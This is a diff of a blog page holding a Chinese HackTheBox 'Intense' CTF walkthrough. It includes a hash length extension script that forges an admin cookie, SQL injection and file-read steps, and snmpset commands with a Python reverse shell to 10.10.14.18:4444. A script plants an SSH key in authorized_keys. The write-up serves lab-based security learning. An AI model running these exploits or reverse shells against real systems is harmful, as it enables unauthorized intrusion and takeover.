@@ -127,8 +127,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -150,7 +157,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -222,81 +229,25 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.195</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:01 CST</span><br><span class="line">Nmap scan report for 10.10.10.195</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)</span><br><span class="line">|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)</span><br><span class="line">|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)</span><br><span class="line">80/tcp  open   http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Intense - WebApp</span><br><span class="line">161/tcp closed snmp</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.48 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>是一个开源系统，提供了guest账号密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082601.jpg" alt=""></p>
 <p>guest登录后可以提交feedback：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082602.jpg" alt=""></p>
 <h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>提供了源码：</p>
 <ul>
 <li><a href="http://10.10.10.195/src.zip" target="_blank" rel="noopener">http://10.10.10.195/src.zip</a></li>
 </ul>
 <p>下载下来分析,很明显是Flask：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082603.jpg" alt=""></p>
 <h2 id="admin-py"><a href="#admin-py" class="headerlink" title="admin.py"></a><strong>admin.py</strong></h2><p>判断权限，然后log view和list功能：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082604.jpg" alt=""></p>
 <h2 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a><strong>app.py</strong></h2><p>主要就是登录登出以及submit功能，submit会判断长度以及过滤一些字符，然后insert，这里可以注入，需要bypass过滤，sqlite3数据库：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082605.jpg" alt=""></p>
 <h2 id="lwt-py"><a href="#lwt-py" class="headerlink" title="lwt.py"></a><strong>lwt.py</strong></h2><p>主要是session，签名，验证之类的：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082606.jpg" alt=""></p>
 <h2 id="utils-py"><a href="#utils-py" class="headerlink" title="utils.py"></a><strong>utils.py</strong></h2><p>登录处理，权限判断，以及log之类的一些：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082607.jpg" alt=""></p>
 <h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>根据代码可以知道cookie是session加sig，解析后是这样：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082608.jpg" alt=""></p>
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sqlite3注入，参考资料：</p>
 <ul>
 <li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL</a> Injection/SQLite Injection.md)</li>
@@ -325,53 +276,18 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] FOUND</span><br><span class="line">admin cookie: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwA7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7.0CuwS&#x2F;U8jtfL33f1MvSD8u5PBphquWkc4xJZYnN6HiA&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p>替换cookie，现在我们是admin：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082610.jpg" alt=""></p>
 <p>##Hashpump.py </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#We know the guest data : (b'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;')</span></span><br><span class="line"><span class="comment">#We know the guest signature : (b'\xf2\x02\x86\xc9\xa5\xb3\x14\x1eO\x8cf4h(\xce\xd5|\xec2f\x04~\xf3W&#123;\x0f\xef\xf5\rq\xfe%') and it's length 32.</span></span><br><span class="line"><span class="comment">#We can perform Hash extension attack.</span></span><br><span class="line"><span class="comment">#Replace the admin secret below</span></span><br><span class="line">form_1 = <span class="string">';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'</span></span><br><span class="line"><span class="comment">#This part will be readable part in cookie, the rest is we have to find by using the length we found in Guest's cookie</span></span><br><span class="line">target = <span class="string">"http://10.10.10.195"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    res = session.post(target + <span class="string">"/postlogin"</span>, data = &#123;<span class="string">"username"</span>: <span class="string">"guest"</span>, <span class="string">"password"</span>: <span class="string">"guest"</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> session.cookies[<span class="string">"auth"</span>]</span><br><span class="line"></span><br><span class="line">cookie = get_cookie()</span><br><span class="line"></span><br><span class="line">(b64_data, b64_sig) = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">data = b64decode(b64_data)</span><br><span class="line">sig = b64decode(b64_sig)</span><br><span class="line">print(<span class="string">'################## The First part'</span>)</span><br><span class="line">print(<span class="string">'data = '</span> + str(data) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'################## The Second part'</span>)</span><br><span class="line">print(<span class="string">'sig = '</span> + str(sig) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hashpumpy Module to perform Hash extension Attack.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    (sigma, datum) = hashpumpy.hashpump(sig.encode(<span class="string">'hex'</span>), data, form_1, i)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Sigma= "</span> + sigma)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Datum= "</span> + datum)</span><br><span class="line">    dat1 = b64encode(datum).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    sig1 = b64encode(binascii.unhexlify(sigma)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Sig1= "</span> + sig1)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Dat1= "</span> + dat1)</span><br><span class="line">    cookie = dat1 + <span class="string">"."</span> + sig1</span><br><span class="line">    print(<span class="string">"cookie: &#123;&#125;"</span>.format(i))</span><br><span class="line">    print(cookie + <span class="string">'\n'</span>)</span><br><span class="line">    req = requests.get(target + <span class="string">"/admin"</span>, cookies = &#123; <span class="string">"auth"</span> : cookie &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Forbidden"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">"[+] FOUND"</span>)</span><br><span class="line">        print(<span class="string">"admin cookie: "</span> + str(cookie))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>根据代码我们知道admin有log view和list功能，页面上没有入口，我们可以直接去访问接口,然后存在目录遍历以及任意文件读取(注意点：如果无法获得内容，加个header<code>Content-Type: application/x-www-form-urlencoded</code>)：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082611.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082612.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082611.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082612.jpg" alt=""></p>
 <p>注意得到的用户，可以知道有snmp</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>直接利用任意文件读取即可得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082613.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082613.jpg" alt=""></p>
 <h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><p>前面知道有snmp，那么就读取snmp配置文件,可以得到RWcommunity：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082614.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082614.jpg" alt=""></p>
 <p>然后根据这篇文章，SNMP任意命令执行：</p>
 <ul>
 <li>SNMP Arbitrary Command Execution. SNMP, the Simple Network Management… | by Kert Ojasoo | The RangeForce CyberSecurity Blog | Medium<br><a href="https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e" target="_blank" rel="noopener">https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e</a></li>
@@ -383,16 +299,7 @@
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 &#39;nsExtendStatus.&quot;evilcommand&quot;&#39; &#x3D; createAndGo &#39;nsExtendCommand.&quot;evilcommand&quot;&#39; &#x3D; &#x2F;usr&#x2F;bin&#x2F;python3 &#39;nsExtendArgs.&quot;evilcommand&quot;&#39; &#x3D; &#39;-c &quot;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((\&quot;10.10.14.18\&quot;,4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\&quot;&#x2F;bin&#x2F;sh\&quot;)&quot;&#39;</span><br><span class="line"></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082615.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082615.jpg" alt=""></p>
 <h2 id="debian-snmp-shell-sh"><a href="#debian-snmp-shell-sh" class="headerlink" title="debian-snmp-shell.sh"></a>debian-snmp-shell.sh</h2><p>可以脚本自动一套：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">random=<span class="string">"gunroot"</span></span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"<span class="variable">$&#123;random&#125;</span>\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"<span class="variable">$&#123;random&#125;</span>\""</span> = /usr/bin/python3 \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"<span class="variable">$&#123;random&#125;</span>\""</span>    = <span class="string">'-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.18\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br></pre></td></tr></table></figure>
 
@@ -401,22 +308,8 @@
 <li>HackTheBox - Intense - YouTube<br><a href="https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec</a></li>
 </ul>
 <h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>转发端口，ret2libc得到root shell</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082616.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082617.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082616.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082617.jpg" alt=""></p>
 <h2 id="tunnel-sh"><a href="#tunnel-sh" class="headerlink" title="tunnel.sh"></a>tunnel.sh</h2><p>有防火墙，ssh连接后秒断，但可以ssh转发端口：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -b 2048 -t ed25519 -f ./key -q -N <span class="string">""</span></span><br><span class="line">key=$(cat key.pub)</span><br><span class="line">shitvalue=<span class="string">"lkabeahbf"</span></span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span> = /bin/bash \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span>    = <span class="string">"-c \"echo <span class="variable">$&#123;key&#125;</span> &gt;&gt; ~/.ssh/authorized_keys\""</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br><span class="line">ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i key</span><br></pre></td></tr></table></figure>
 
@@ -441,7 +334,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-11-16T00:39:31.708Z" itemprop="dateUpdated">2020-11-16 08:39:31</time>
+    Last updated: <time datetime="2020-11-16T00:39:31.708Z" itemprop="dateUpdated">2020-11-16 08:39:31</time>
 </span><br>
 
 
@@ -608,11 +501,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
